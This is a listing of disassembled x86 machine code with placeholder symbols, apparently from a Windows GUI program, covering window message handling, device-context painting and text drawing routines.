mov eax [ eax + 0x8 ]
mov edx ebp
call sub_410fc4
test eax eax
jne r-xdata
sub_47af58
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push 0x0
push 0x0
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0xc ]
mov eax esi
call sub_470990
lea edx [ esp + 0x28 ]
xor ecx ecx
mov eax esi
call sub_476708
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx eax [ esp + 0xe ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov ebp [ esp + 0x18 ]
and ebp 0xffff
mov eax [ esp + 0x1c ]
shl eax 0x10
or ebp eax
push ebp
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_472314
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_473c54
sub_47b010
push ebx
mov ebx edx
mov dl 0x1
call sub_4946a4
test eax eax
je r-xdata
pop ebx
retn
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x10002
mov edx 0x127
call sub_472314
jmp r-xdata
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x20002
mov edx 0x127
call sub_472314
add ebx 0xffffffed
sub bx 0x4
jae r-xdata
sub_47b05c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x56 ] 0x1
setne al
mov [ ebp - 0xd ] al
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10000
xor eax eax
push ebp
push sub_47b12b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x8 ] 0x1
je r-xdata
retn
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfffeffff
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47b0ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4770b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b132
cmp [ ebp - 0xd ] 0x0
jne r-xdata
sub_47b138
push ebp
mov ebp esp
add esp 0xffffff5c
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
jne r-xdata
lea eax [ ebp - 0x78 ]
xor ecx ecx
mov edx 0x30
call sub_404c14
mov [ ebp - 0x78 ] 0x30
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call j_sub_40c772
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call DefWindowProcW
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_47b4c0
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x98 ]
xor ecx ecx
mov edx 0x20
call sub_404c14
movzx eax [ ebp - 0x70 ]
add ax 0x100
mov [ ebp - 0x98 ] ax
movzx eax [ ebp - 0x98 ]
cmp ax 0x101
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call DefWindowProcW
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
cmp ax 0x102
je r-xdata
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x250 ]
jmp r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x68 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0x66 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call j_sub_40c472
lea ecx [ ebp - 0xa0 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_470990
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x90 ] eax
movzx eax [ r-xdata ]
mov [ ebp - 0x8c ] al
mov esi [ ebp - 0x74 ]
mov eax esi
and eax 0x1
cmp eax 0x1
jne r-xdata
mov edx [ ebx + 0xac ]
test [ edx + 0x11 ] 0x10
je r-xdata
mov eax esi
and eax 0x2
cmp eax 0x2
jne r-xdata
or [ ebp - 0x8c ] 0x1
movsx edx [ ebp - 0x98 ]
movzx edx [ edx + rw-data ]
mov ecx [ ebx + 0xac ]
cmp dl 0x7
ja r-xdata
and esi 0x4
cmp esi 0x4
jne r-xdata
or [ ebp - 0x8c ] 0x2
jae r-xdata
and edx 0x7f
movzx ecx [ ecx + 0x10 ]
bt ecx edx
movsx eax [ ebp - 0x98 ]
add eax 0xfffffefd
cmp eax 0x4
ja r-xdata
or [ ebp - 0x8c ] 0x4
mov ebx eax
lea eax [ ebp - 0x98 ]
push eax
xor ecx ecx
mov edx 0xb052
mov eax ebx
call sub_472348
mov esi eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] esi
mov eax [ ebp - 0x8 ]
dec esi
je r-xdata
jmp [ eax * 4 + jump_table_47b2f1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call j_sub_40c786
cmp [ ebp - 0x98 ] 0x102
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call DefWindowProcW
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x54 ]
xor edx edx
mov [ ebp - 0x1c ] ax
mov eax [ ebp - 0x54 ]
xor edx edx
shr eax 0x10
mov [ ebp - 0x1a ] ax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x20 ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebp - 0x68 ]
add [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x66 ]
add [ ebp - 0xc ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
movzx eax [ ebp - 0x58 ]
mov [ ebp - 0xa4 ] eax
fild [ ebp - 0xa4 ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
fld [ r-xdata ]
fmulp st1
fld [ r-xdata ]
fsubp st1
fstp [ ebp - 0x48 ]
fwait
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x34 ]
call sub_479ce0
push eax
call j_sub_40c472
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_479ce0
push eax
call j_sub_40c472
jmp r-xdata
lea ecx [ ebp - 0x30 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_470990
movzx eax [ ebp - 0x30 ]
mov [ ebp - 0x34 ] ax
movzx eax [ ebp - 0x2c ]
mov [ ebp - 0x32 ] ax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_47b528
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47b881
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
movsx eax [ ebp - 0x16 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi + 0x258 ]
push eax
call j_sub_40c472
lea ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_470990
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax esi
call sub_476708
mov ebx eax
mov [ esi + 0x250 ] ebx
test ebx ebx
jne r-xdata
mov ebx [ esi + 0x250 ]
lea ecx [ ebp - 0x13 ]
lea edx [ ebp - 0x11 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
jmp r-xdata
mov [ esi + 0x250 ] esi
cmp [ ebx + 0x34 ] 0x0
je r-xdata
movzx eax [ r-xdata ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov eax [ ebx + 0xac ]
test [ eax + 0x11 ] 0x10
jne r-xdata
push 0x5
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x3c
call sub_404c14
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x4
test [ ebp - 0x11 ] 0x2
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
test [ ebp - 0x13 ] 0x2
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x1
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x8
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x4
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
test [ ebp - 0x11 ] 0x2
setne al
xor al 0x1
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
test [ ebp - 0x13 ] 0x2
setne dl
xor dl 0x1
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x1
setne dl
xor dl 0x1
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x8
setne dl
xor dl 0x1
and edx 0x7f
or eax [ edx * 4 + rw-data ]
test [ ebp - 0x13 ] 0x4
setne dl
xor dl 0x1
and edx 0x7f
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x3
test [ ebp - 0x11 ] 0x1
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
test [ ebp - 0x11 ] 0x1
setne al
xor al 0x1
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x5
test [ ebp - 0x11 ] 0x4
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] eax
test [ ebp - 0x11 ] 0x4
setne al
xor al 0x1
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x6
test [ ebp - 0x11 ] 0x8
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
test [ ebp - 0x11 ] 0x8
setne al
xor al 0x1
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x7
test [ ebp - 0x11 ] 0x10
setne al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
test [ ebp - 0x11 ] 0x10
setne al
xor al 0x1
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
push 0x1
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov ebx [ ebx + 0x34 ]
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x12 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
test [ ebp - 0x11 ] 0x2
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_408754
push eax
push 0x0
mov eax esi
call sub_479ce0
push eax
call j_sub_40c79a
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b888
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
movzx eax [ ebp - 0x14 ]
or al [ ebp - 0x13 ]
mov [ ebp - 0x13 ] al
movzx eax [ rw-data ]
not eax
and al [ ebp - 0x14 ]
or al [ ebp - 0x13 ]
mov [ ebp - 0x13 ] al
jmp r-xdata
movzx eax [ ebp - 0x12 ]
or al [ ebp - 0x11 ]
mov [ ebp - 0x11 ] al
sub_47b891
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
movzx eax [ edi + 0x8 ]
movzx edx [ edi + 0xa ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
push esp
mov eax [ ebx + 0x258 ]
push eax
call j_sub_40c472
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax ebx
call sub_470990
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_476708
mov esi eax
test esi esi
jne r-xdata
mov [ edi + 0xc ] 0x198319
xor eax eax
mov edx rw-data
mov esi ebx
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x1e ] bx
inc eax
add edx 0x4
cmp al 0x9
jne r-xdata
mov ecx [ edx ]
not ecx
and [ edi + 0xc ] ecx
mov ecx [ esi + 0xac ]
mov ebx eax
cmp bl 0xf
ja r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_47b93c
push esi
mov esi eax
test [ esi + 0x52 ] 0x4
setne al
cmp dl al
je r-xdata
pop esi
retn
test dl dl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_47b990
push esi
mov esi eax
mov ecx [ eax + 0x34 ]
jmp r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
pop esi
retn
and edx 0x7f
push edx
mov ecx eax
mov eax esi
mov edx 0xb046
call sub_4709ec
mov esi ecx
mov ecx [ ecx + 0x34 ]
sub_47b9d4
push ebx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call RemovePropW
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call RemovePropW
pop ebx
retn
sub_47ba04
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx [ esi + 0x90 ]
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_4784d0
dec eax
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_47ba3c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
test bl bl
je r-xdata
and [ ebp + 0x54 ] 0xffffdfff
or [ ebp + 0x54 ] 0x2000
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x1e0 ]
test eax eax
je r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebp + 0x1e0 ]
call sub_4305a0
mov edx ebx
call sub_47ba3c
inc edi
dec esi
jne r-xdata
sub_47ba8c
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
test [ ebx + 0x1c ] 0x2
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x48 ]
mov [ esi ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4 ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1bc ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1bc ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov [ esi ] eax
mov eax [ ebx + 0x268 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_47bb08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
push ebp
push sub_47bb78
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470d24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb7f
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
sub_47bb84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47c590
mov edx 0x80ffff
mov eax esi
call sub_470fdc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x7c ]
mov eax [ esi + 0x270 ]
call sub_44de18
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_44ce9c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_47bbec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4759a4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_417224
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_47593c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_47bc58
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47bcae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bcb5
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ReleaseDC
retn
sub_47bcbc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x30 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47bdd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor edx edx
mov eax 0x6
call sub_417224
test al al
je r-xdata
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x7c ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x270 ]
mov eax [ eax + 0x40 ]
call sub_44c1c8
mov eax [ ebx + 0x270 ]
call sub_44df24
mov esi eax
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_470e50
mov edi [ ebp - 0x30 ]
mov eax ebx
call sub_473bf8
or eax 0x810
mov ebx eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
mov [ ebp - 0x34 ] edi
mov eax [ ebp - 0x34 ]
call sub_407134
push eax
push esi
call DrawTextW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bdd8
lea eax [ ebp - 0x30 ]
call j_sub_4068a0
retn
call sub_485c78
call sub_485d84
test al al
je r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x4
push 0x4
lea eax [ ebp - 0x10 ]
push eax
call InflateRect
call sub_485c78
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x2c ]
mov dl 0x2
mov eax esi
call sub_486b98
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x270 ]
call sub_44df24
mov edx eax
mov eax esi
pop ecx
call sub_485f5c
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_47bde0
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x109
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20e
jbe r-xdata
xor eax eax
pop esi
retn
sub_47be50
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47bedb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47b978
cmp [ ebx + 0x278 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bee2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_470e50
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x270 ]
call sub_44cfbc
mov edx eax
add edx 0x6
mov eax ebx
call sub_4704a0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_470e50
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x270 ]
call sub_44cf9c
mov edx eax
add edx 0x4
mov eax ebx
call sub_4704d4
sub_47bee8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
lea esi [ ebp - 0x24 ]
xor eax eax
push ebp
push sub_47c1a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x278 ] 0x1
xor edx edx
push ebp
push sub_47c183
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_470e88
add [ esi + 0xc ] 0x4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_47240c
mov eax [ esi ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_49e728
mov ebx eax
mov eax ebx
call sub_49d0dc
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x48 ]
jge r-xdata
mov eax ebx
call sub_49d0a8
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov eax ebx
call sub_49d0dc
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4704a0
mov eax ebx
call sub_49d0c4
mov edi eax
mov eax ebx
call sub_49d0a8
add edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ esi + 0x4 ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_49d0a8
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4704d4
mov eax ebx
call sub_49d090
mov edi eax
mov eax ebx
call sub_49d0dc
add edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
add eax [ esi ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_49d0c4
mov edi eax
mov eax ebx
call sub_49d0a8
add edi eax
mov eax [ ebp - 0x8 ]
sub edi [ eax + 0x4c ]
mov [ esi + 0x4 ] edi
mov eax ebx
call sub_49d090
cmp eax [ esi ]
jle r-xdata
mov eax ebx
call sub_49d090
mov edi eax
mov eax ebx
call sub_49d0dc
add edi eax
mov eax [ ebp - 0x8 ]
sub edi [ eax + 0x48 ]
mov [ esi ] edi
mov eax ebx
call sub_49d0c4
cmp eax [ esi + 0xc ]
jle r-xdata
mov eax ebx
call sub_49d090
mov [ esi ] eax
mov eax [ rw-data ]
